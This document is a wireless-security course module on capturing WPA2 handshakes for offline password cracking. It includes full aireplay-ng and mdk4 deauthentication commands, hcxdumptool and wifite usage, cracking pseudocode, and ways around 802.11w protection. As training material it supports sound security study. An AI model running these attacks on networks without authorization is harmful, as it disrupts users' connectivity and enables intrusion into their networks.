# Module 06 — Capturing the WPA2 4-Way Handshake

> **Prerequisites:** [Module 05 — WEP Cracking](../module-05-wep-cracking/)
> **Next Module:** [Module 07 — WPA2 Cracking](../module-07-wpa2-cracking/)

---

## Table of Contents

1. [Introduction to WPA2 Security](#1-introduction-to-wpa2-security)
2. [WPA2 Key Derivation — PMK & PTK](#2-wpa2-key-derivation--pmk--ptk)
3. [The 4-Way Handshake — Deep Dive](#3-the-4-way-handshake--deep-dive)
4. [Why the Handshake Enables Offline Cracking](#4-why-the-handshake-enables-offline-cracking)
5. [Handshake Capture Methods Overview](#5-handshake-capture-methods-overview)
6. [Method 1: Passive Capture](#6-method-1-passive-capture)
7. [Method 2: Deauthentication Attack](#7-method-2-deauthentication-attack)
8. [Method 3: Disassociation Attack](#8-method-3-disassociation-attack)
9. [Method 4: hcxdumptool (Advanced)](#9-method-4-hcxdumptool-advanced)
10. [Method 5: wifite (Automated)](#10-method-5-wifite-automated)
11. [Verifying Captured Handshakes](#11-verifying-captured-handshakes)
12. [Handling Partial Handshakes](#12-handling-partial-handshakes)
13. [KRACK — Key Reinstallation Attack (CVE-2017-13077)](#13-krack--key-reinstallation-attack-cve-2017-13077)
14. [802.11w (PMF) — When Deauth Fails](#14-80211w-pmf--when-deauth-fails)
15. [hcxpcapngtool — Converting for hashcat](#15-hcxpcapngtool--converting-for-hashcat)
16. [Troubleshooting Common Issues](#16-troubleshooting-common-issues)
17. [Knowledge Check](#17-knowledge-check)

---

## 1. Introduction to WPA2 Security

WPA2 (Wi-Fi Protected Access II), standardized in **IEEE 802.11i (2004)**, addresses every WEP weakness:

| Feature | WEP | WPA2 |
|---------|-----|------|
| Cipher | RC4 (weak stream) | AES-CCMP (128-bit block) |
| IV size | 24-bit | 48-bit CCMP PN (per-packet) |
| Key derivation | Static, manual | PBKDF2-SHA1 (4096 rounds) |
| Integrity | CRC-32 (linear, forgeable) | HMAC-SHA1 MIC (cryptographic) |
| Session keys | Shared static key | Unique PTK per session |
| IV reuse | Trivially exploitable | Replay detection (PN counter) |

### WPA2 Variants

| Variant | Authentication | Used In |
|---------|---------------|---------|
| **WPA2-Personal (PSK)** | Pre-Shared Key | Homes, small business |
| **WPA2-Enterprise (MGT)** | 802.1X / RADIUS | Corporate (Module 13) |

**WPA2 is NOT broken by cryptanalysis** — AES-CCMP is sound. The attack surface is entirely the **key derivation from passphrase** — exposed through the 4-way handshake.

---

## 2. WPA2 Key Derivation — PMK & PTK

### PMK (Pairwise Master Key)

The PMK is the root key, derived once per passphrase+SSID pair:

```
PMK = PBKDF2(HMAC-SHA1, passphrase, SSID, 4096 iterations, 256 bits)
```

- `passphrase` = the Wi-Fi password
- `SSID` = the network name (case-sensitive)
- `4096 iterations` = computational cost (makes brute-force slow)
- Output: 32-byte (256-bit) key

**Critical:** Both the passphrase AND the SSID are inputs. WPA2 rainbow tables are SSID-specific — a table for `"linksys"` is useless against `"HomeNet"`.

### PTK (Pairwise Transient Key)

The PTK is derived per-session from the PMK and exchanged nonces:

```
PTK = PRF-512(PMK,
              "Pairwise key expansion",
              Min(AP_MAC, STA_MAC) || Max(AP_MAC, STA_MAC) ||
              Min(ANonce, SNonce)  || Max(ANonce, SNonce))
```

The PTK is **512 bits** and splits into:
- **KCK** (Key Confirmation Key, 128 bits) — used to compute MIC in handshake
- **KEK** (Key Encryption Key, 128 bits) — used to encrypt GTK in Message 3
- **TK** (Temporal Key, 256 bits) — AES-CCMP session encryption key

### Why This Is Crackable

When you capture the handshake, you have:
- `ANonce` — from Message 1 (plaintext)
- `SNonce` — from Message 2 (plaintext)
- `AP_MAC` and `STA_MAC` — from frame headers
- `MIC` — from Message 2 (computed from the KCK portion of PTK)

A candidate passphrase → PMK → PTK → KCK → compute MIC → compare against captured MIC.

```
For each candidate_password:
  candidate_PMK = PBKDF2(HMAC-SHA1, candidate_password, SSID, 4096)
  candidate_PTK = PRF(candidate_PMK, nonces, MACs)
  candidate_KCK = candidate_PTK[0:16]
  candidate_MIC = HMAC-SHA1(candidate_KCK, EAPOL_message_2_body)
  if candidate_MIC == captured_MIC:
    FOUND! password = candidate_password
```

This loop is what `aircrack-ng` and `hashcat` perform — entirely offline.

---

## 3. The 4-Way Handshake — Deep Dive

```
  Client (Supplicant)                            AP (Authenticator)
        │                                              │
        │         EAPOL Message 1 (ANonce)             │
        │ ◄─────────────────────────────────────────── │
        │   AP sends random 256-bit ANonce             │
        │   No MIC — first message, keys not yet set   │
        │                                              │
        │  [Client: PMK → PTK using ANonce+SNonce+MACs]│
        │                                              │
        │   EAPOL Message 2 (SNonce + MIC)             │
        │ ──────────────────────────────────────────► │
        │   Client sends its random 256-bit SNonce     │
        │   MIC = HMAC(KCK, EAPOL_frame_body)          │
        │   ★ THIS IS THE CRACKING TARGET ★           │
        │                                              │
        │         EAPOL Message 3 (GTK + MIC)          │
        │ ◄─────────────────────────────────────────── │
        │   AP encrypted GTK (broadcast key)           │
        │   New ANonce + MIC (AP confirms PTK match)   │
        │                                              │
        │         EAPOL Message 4 (ACK + MIC)          │
        │ ──────────────────────────────────────────► │
        │   Client acknowledges key installation       │
        │   [Encrypted data session begins]            │
```

### Per-Message Analysis

| Msg | Direction | Key Info | Contains | Attack Role |
|-----|-----------|----------|----------|-------------|
| M1 | AP→Client | `0x008a` | ANonce | Gives attacker ANonce |
| **M2** | Client→AP | `0x010a` | SNonce + **MIC** | **Primary cracking target** |
| M3 | AP→Client | `0x13ca` | Encrypted GTK + MIC | Confirms PTK; used by KRACK |
| M4 | Client→AP | `0x030a` | Final ACK MIC | Session starts |

**Minimum capture for cracking:** M1 + M2 (provides ANonce, SNonce, MIC).

---

## 4. Why the Handshake Enables Offline Cracking

The handshake does NOT transmit the password. But it transmits a **proof of knowledge** (the MIC). This proof can be verified offline against any candidate password — without further interaction with the AP.

### The Offline Cracking Loop

```python
# What aircrack-ng and hashcat -m 22000 do internally:
for password in wordlist:
    pmk = PBKDF2_SHA1(password, ssid, iterations=4096, dklen=32)
    ptk = PRF_512(pmk, "Pairwise key expansion", ap_mac, sta_mac, anonce, snonce)
    kck = ptk[0:16]
    computed_mic = HMAC_SHA1_128(kck, eapol_message_2_body)
    if computed_mic == captured_mic:
        print(f"PASSWORD FOUND: {password}")
        break
```

### Cost Per Guess

Each candidate password requires:
- 1× PBKDF2 (4096× SHA1 rounds) — ~1.5 ms on CPU
- 1× PRF-512 — fast
- 1× HMAC-SHA1 — fast

CPU: ~650 passwords/second per core
GPU (RTX 4090): ~1,900,000 passwords/second

---

## 5. Handshake Capture Methods Overview

| Method | Stealth | Speed | Tools | Best For |
|--------|---------|-------|-------|----------|
| Passive | ★★★★★ | Slow | airodump-ng | Authorized tests; no disruption |
| Broadcast Deauth | ★★☆☆☆ | Fast | aireplay-ng | Quick lab captures |
| Targeted Deauth | ★★★☆☆ | Fast | aireplay-ng | Minimize client disruption |
| Disassociation | ★★★☆☆ | Fast | aireplay-ng | Alternative to deauth |
| hcxdumptool | ★★★★☆ | Fast | hcxdumptool | PMKID + EAPOL combined |
| wifite | ★★☆☆☆ | Auto | wifite | Quick lab audits |

---

## 6. Method 1: Passive Capture

Most stealthy — purely passive, zero transmission.

```bash
# Step 1: Kill interfering processes
sudo airmon-ng check kill

# Step 2: Enable monitor mode
sudo airmon-ng start wlan0

# Step 3: Run targeted passive capture
sudo airodump-ng \
  --bssid AA:BB:CC:DD:EE:FF \   # Target AP MAC
  -c 6 \                        # Target channel (locked — never miss a frame)
  -w handshake_passive \        # Output prefix
  --output-format pcap \        # PCAP format
  wlan0mon

# Watch for: "WPA handshake: AA:BB:CC:DD:EE:FF" in top-right corner
# When it appears → press Ctrl+C
```

---

## 7. Method 2: Deauthentication Attack

Forces client reconnection by sending forged 802.11 deauth frames from the AP's MAC.

```bash
# Terminal 1: Capture
sudo airodump-ng \
  --bssid AA:BB:CC:DD:EE:FF \
  -c 6 \
  -w handshake_deauth \
  wlan0mon

# Terminal 2: Deauthentication (broadcast — kicks all clients)
sudo aireplay-ng \
  --deauth 5 \                         # -0 5 : send 5 deauth frames, then stop
  -a AA:BB:CC:DD:EE:FF \               # -a : AP BSSID (spoofed as source)
  wlan0mon

# Terminal 2: Targeted deauth (single client — less disruptive)
sudo aireplay-ng \
  --deauth 5 \
  -a AA:BB:CC:DD:EE:FF \               # AP BSSID
  -c 11:22:33:44:55:66 \               # -c : target client MAC
  wlan0mon

# Flag breakdown:
# --deauth N / -0 N   → send N deauth frames (0 = infinite loop)
# -a <BSSID>          → AP BSSID used as spoofed source of deauth
# -c <MAC>            → target a specific client (omit for broadcast)
# --ignore-negative-one → ignore channel mismatch errors (use if "Fixed channel wlan0mon: -1")

# If channel mismatch error appears:
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF --ignore-negative-one wlan0mon
```

### How Many Deauth Frames?

| Count (`-0 N`) | Behavior | When to Use |
|---------------|----------|-------------|
| `0` | Infinite loop | Lab only — will DoS continuously |
| `1–3` | Light tap | When PMF partially enabled |
| `5–10` | Standard | Most common — reliable reconnection |
| `30+` | Aggressive | Very stubborn clients |

---

## 8. Method 3: Disassociation Attack

Sends Disassociation frames instead of Deauthentication. The difference:
- **Deauth** → drops client to State 1 (must re-auth AND re-associate)
- **Disassoc** → drops client to State 2 (must re-associate only)

Both result in the 4-way handshake being performed again.

```bash
sudo aireplay-ng \
  --deauth 5 \
  -a AA:BB:CC:DD:EE:FF \
  -c 11:22:33:44:55:66 \
  wlan0mon
# Note: aireplay-ng --deauth sends both deauth AND disassoc frames

# For explicit disassociation only (using mdk4):
sudo mdk4 wlan0mon d \
  -b whitelist_file \        # Don't deauth these MACs
  -c 6 \                     # Channel
  -s 50                      # Speed (packets per second)
```

---

## 9. Method 4: hcxdumptool (Advanced)

`hcxdumptool` is the modern replacement for airodump-ng + aireplay-ng for handshake capture. It captures both EAPOL handshakes **and** PMKIDs passively.

```bash
# Basic passive capture (all APs)
sudo hcxdumptool \
  -i wlan0mon \                      # Monitor interface
  -o capture.pcapng \                # Output (must be .pcapng format)
  --enable_status=1                  # REQUIRED in hcxdumptool v6+ for output

# All flags explained:
# -i <iface>              → interface in monitor mode
# -o <file.pcapng>        → output file (pcapng format — NOT .cap)
# --enable_status=1       → show status output (required v6+; 1=minimal, 3=verbose)
# --filtermode=2          → capture from all APs (1=only listed APs, 2=all except listed)
# --filterlist_ap=<file>  → file with AP BSSIDs (one per line) for --filtermode
# --rcascan=active        → send probe requests to reveal hidden APs
# --do_rcascan            → DEPRECATED in v6 (use --rcascan=active instead)

# Target specific AP only:
echo "AA:BB:CC:DD:EE:FF" > target_aps.txt
sudo hcxdumptool \
  -i wlan0mon \
  -o capture.pcapng \
  --enable_status=1 \
  --filtermode=1 \                   # Only capture from listed APs
  --filterlist_ap=target_aps.txt     # AP filter file

# Run for 60 seconds then stop:
sudo timeout 60 hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1
```

### Checking What Was Captured

```bash
# Quick summary of capture contents
hcxpcapngtool --info capture.pcapng

# Example output:
# [00:00:35] 1 EAPOL pairs processed (M1M2 pairs: 1, M1M2M3M4 pairs: 0)
# [00:00:35] 3 PMKIDs processed

# This tells you: 1 crackable handshake + 3 PMKIDs captured
```

---

## 10. Method 5: wifite (Automated)

`wifite` automates the entire workflow: scan → select target → deauth → capture → verify.

```bash
# Attack all WPA2 networks in range
sudo wifite

# Attack specific BSSID
sudo wifite --bssid AA:BB:CC:DD:EE:FF

# wifite flags:
# --wpa          → only attack WPA/WPA2 networks
# --wep          → only attack WEP networks
# --bssid <MAC>  → target specific AP
# --channel <N>  → only scan specific channel
# --kill         → kill interfering processes before starting
# --crack        → attempt to crack after capture (using built-in wordlist)
# --dict <file>  → use this wordlist for cracking
# --no-deauths   → passive only (no deauth injection)
# --pmkid        → use PMKID attack instead of handshake (calls hcxdumptool)

# wifite workflow:
# 1. Scans for targets → shows numbered list
# 2. Select target by number (or "all")
# 3. Sends deauth → waits for handshake
# 4. Saves .cap file to cracked/ directory
# 5. Optionally cracks with wordlist
```

---

## 11. Verifying Captured Handshakes

### Method 1: aircrack-ng (Simplest)

```bash
aircrack-ng handshake-01.cap

# Output:
# Opening handshake-01.cap
# Read 1524 packets.
#
# #  BSSID              ESSID       Encryption
# 1  AA:BB:CC:DD:EE:FF  MyNetwork  WPA2 (1) handshake  ← valid
# 2  00:11:22:33:44:55  OtherAP    WPA (0) handshake   ← NOT captured
```

### Method 2: hcxpcapngtool (Most Detailed)

```bash
# Check capture contents
hcxpcapngtool --info capture.pcapng

# Convert to hashcat format AND check:
hcxpcapngtool \
  -o hashes.hc22000 \          # Output in hashcat format 22000
  --csv=summary.csv \           # Write summary CSV
  capture.pcapng

# Output summary:
# [00:00:01] 1 EAPOL pairs processed
# [00:00:01] M1M2 pairs: 1  M1M2M3M4 pairs: 0
# [00:00:01] PMKID count: 0
# [00:00:01] written to hashes.hc22000
```

### Method 3: tshark

```bash
# Verify EAPOL messages present and their numbers
tshark -r handshake-01.cap \
  -Y "eapol" \
  -T fields \
  -e frame.number \
  -e eapol.keydes.msgnr \
  -e wlan.sa \
  -e wlan.da

# You need at minimum: message 1 AND message 2 from same exchange
# (same src/dst pair in opposite directions)
```

### Method 4: cowpatty

```bash
# Verify with cowpatty (also checks for MIC validity)
cowpatty -r handshake-01.cap -s "MyNetwork" -f /dev/null
# -r = capture file, -s = SSID, -f /dev/null = no wordlist (verification only)
# Output: "Collected all necessary data to mount crack against WPA/PSK passphrase"
```

---

## 12. Handling Partial Handshakes

A "partial handshake" means you captured some but not all 4 messages. Understanding what you have determines whether cracking is possible.

### What You Need

```
Minimum for cracking:
  ✓ Message 1 (AP→Client) — provides ANonce
  ✓ Message 2 (Client→AP) — provides SNonce + MIC

Also acceptable:
  ✓ Message 2 + Message 3 (M3 also contains ANonce + MIC)
```

### What to Do with a Partial Capture

```bash
# Check exactly which messages you captured:
tshark -r handshake-01.cap -Y "eapol" \
  -T fields -e eapol.keydes.msgnr | sort | uniq -c

# If you only have M1 (no M2):
# → No MIC to verify against → cannot crack → need to recapture

# If you have M2 and M3 but not M1:
# → M3 contains ANonce → aircrack-ng may still work
# → Try: aircrack-ng handshake-01.cap

# If aircrack-ng shows "WPA (0) handshake":
# → Not usable → send another deauth and recapture

# Merge multiple partial captures:
mergecap -a -F pcap -w merged.cap capture-01.cap capture-02.cap
# mergecap: from Wireshark suite — merges multiple .cap files
# -a = append (chronological order), -F pcap = output format
```

---

## 13. KRACK — Key Reinstallation Attack (CVE-2017-13077)

KRACK (published October 2017) is a critical vulnerability in the WPA2 **4-way handshake state machine** — not in AES-CCMP itself.

### The Vulnerability

The 802.11 standard requires retransmission of Message 3 if no ACK is received. An attacker in a MITM position can:

1. Block Message 4 from reaching the AP
2. Force the AP to retransmit Message 3
3. When the client installs keys on receiving M3 retransmission → **nonce reset to 0**
4. Nonce reuse in AES-CCM causes keystream reuse → plaintext recovery

### KRACK Execution Concept

```
Normal handshake:
  AP →[M3]→ Client: install keys, PN=0
  Client →[M4]→ AP: ACK

KRACK attack:
  AP →[M3]→ Client: install keys, PN=0
  Attacker blocks M4
  AP →[M3 retransmit]→ Client: RE-INSTALL keys, PN resets to 0  ← nonce reuse!
  Same keystream generated → XOR two encrypted packets → plaintext recovery
```

### CVEs

| CVE | Description |
|-----|-------------|
| **CVE-2017-13077** | Reinstallation of PTK (4-way handshake M3 replay) |
| CVE-2017-13078 | Reinstallation of GTK |
| CVE-2017-13079 | Reinstallation of IGTK (802.11w) |
| CVE-2017-13086 | PeerKey handshake key reinstallation |

### Detection and Status

```bash
# Check if a device is patched:
# - Linux (kernel ≥ 4.14.11) → patched
# - Android 6.0+ patched (November 2017 security update)
# - iOS/macOS → patched (October 2017)
# - Windows → patched (October 2017 KB4041681)
# - Embedded devices (IoT) → often UNPATCHED

# KRACK PoC tool (testing only, against your own devices):
# https://github.com/vanhoefm/krackattacks-scripts
```

---

## 14. 802.11w (PMF) — When Deauth Fails

**Management Frame Protection (802.11w / PMF)** encrypts and authenticates deauth and disassoc frames using the PTK. WPA3 mandates it; WPA2 can optionally enable it.

### Detecting PMF

```bash
# airodump-ng shows PMF capability in output
# Look for CIPHER column — some APs show "CCMP" with PMF flag

# Better: use Wireshark to check RSN capabilities in beacon
# Expand beacon → Tagged Parameters → RSN Information
# Look for: Management Frame Protection Capable/Required bits

# tshark:
tshark -r capture.pcapng \
  -Y "wlan.fc.type_subtype == 8 && wlan.bssid == aa:bb:cc:dd:ee:ff" \
  -T fields -e wlan_mgt.rsn.capabilities.mfpr \
              -e wlan_mgt.rsn.capabilities.mfpc
# 1 = MFP Required (deauth always protected)
# 0 = MFP Capable (deauth protected after association)
```

### Impact on Deauth Attacks

| PMF Status | Effect on Deauth |
|-----------|-----------------|
| PMF disabled | Deauth works normally |
| PMF capable | Deauth works before association (no PTK yet) |
| PMF required | **Forged deauth frames rejected by client** |

### Workarounds

When PMF is enabled, alternative approaches:
1. **Channel-switch attack** — Forge 802.11 Action frame with channel-switch announcement (not protected in all implementations)
2. **Physical layer DoS** — Jam the channel with mdk4 beacon flood (doesn't require authentication)
3. **PMKID attack (Module 12)** — No deauth needed; extract PMKID from AP directly
4. **Evil Twin (Module 09)** — Client association to rogue AP; PMF only protects the legitimate AP's management frames

---

## 15. hcxpcapngtool — Converting for hashcat

```bash
# Convert pcapng capture to hashcat format 22000
hcxpcapngtool \
  -o output.hc22000 \           # Hashcat 22000 format (EAPOL + PMKID combined)
  --csv=report.csv \             # Human-readable summary
  --json=report.json \           # JSON output for scripting
  capture.pcapng

# Flag reference:
# -o <file>              → output file (hashcat -m 22000)
# -E <file>              → export ESSID list (useful for targeted cracking)
# -I <file>              → export client MAC list
# --csv=<file>           → write CSV summary
# --json=<file>          → write JSON summary
# --info                 → print summary to stdout (no conversion)

# Verify what was converted:
wc -l output.hc22000             # Line count = number of crackable hashes
head -1 output.hc22000           # Preview first hash entry

# Hash format: WPA*02*MIC*AP_MAC*STA_MAC*ESSID*ANONCE*EAPOL*MESSAGEPAIR
# Example:
# WPA*02*4d4fe7aac3a2cecab195321ccd5c8916*aa:bb:cc:dd:ee:ff*11:22:33:44:55:66*
#    4d794e6574776f726b*4024e00d0234c1xxxxxx*010000000000000000...
```

---

## 16. Troubleshooting Common Issues

### Issue: Handshake never captured despite deauth

```bash
# Check 1: Are you on the right channel?
iw dev wlan0mon info | grep channel
# Must match the AP's channel exactly

# Check 2: Is deauth actually working? (client should briefly disconnect)
sudo airodump-ng --bssid AP_BSSID -c CH wlan0mon
# Watch the client list — after deauth, client should disappear then reappear

# Check 3: Is PMF enabled? (check RSN capabilities in beacon)
tshark -r capture.pcapng -Y "wlan.fc.type_subtype == 8" \
  -T fields -e wlan_mgt.rsn.capabilities.mfpr 2>/dev/null

# Check 4: Channel mismatch error
sudo aireplay-ng --deauth 5 -a AP_BSSID --ignore-negative-one wlan0mon
```

### Issue: `WPA (0) handshake` in aircrack-ng output

```bash
# 0 handshake = no EAPOL exchange captured at all
# Check if ANY EAPOL frames were captured:
tshark -r capture.cap -Y "eapol" | wc -l

# If 0 → no EAPOL frames at all → timing issue (sent deauth too early)
# Solution: Start capture FIRST, wait for it to stabilize, THEN send deauth

# If >0 but <4 → partial handshake
# Solution: Use mergecap to combine multiple captures and try again
```

### Issue: hcxdumptool exits immediately with no output

```bash
# v6+ requires --enable_status flag
sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1

# Also verify interface is in monitor mode:
iwconfig wlan0mon | grep Mode   # Must say Monitor

# Check hcxdumptool version:
hcxdumptool --version
```

---

## 17. Knowledge Check

Before proceeding to Module 07:

1. Write the PMK derivation formula. Why are both the passphrase AND the SSID inputs?
2. What is the PTK composed of (KCK, KEK, TK) and what is each sub-key used for?
3. Why is M1+M2 the minimum requirement for offline cracking, and what does each provide?
4. Write the complete 2-terminal command sequence to capture a WPA2 handshake using deauth.
5. What does `aireplay-ng --deauth 0` do and why is it dangerous in a real engagement?
6. How do you fix the "Fixed channel wlan0mon: -1" error when running deauth?
7. What is KRACK (CVE-2017-13077) and which step of the 4-way handshake does it exploit?
8. What does 802.11w PMF protect and how does it affect deauthentication attacks?
9. What `hcxdumptool` flags are required in version 6+ that were not needed in older versions?
10. Write the command to convert a `.pcapng` capture to hashcat format 22000.
11. If `aircrack-ng` shows `WPA (0) handshake`, what does this mean and how do you fix it?
12. What is the difference between deauthentication and disassociation, and which one does `aireplay-ng --deauth` send?
13. How do you merge two partial capture files to improve handshake completeness?
14. Name three alternative approaches when PMF/802.11w blocks standard deauth attacks.

---

**Next:** [Module 07 — WPA2 Cracking — Dictionary, Rule & Brute Force](../module-07-wpa2-cracking/)
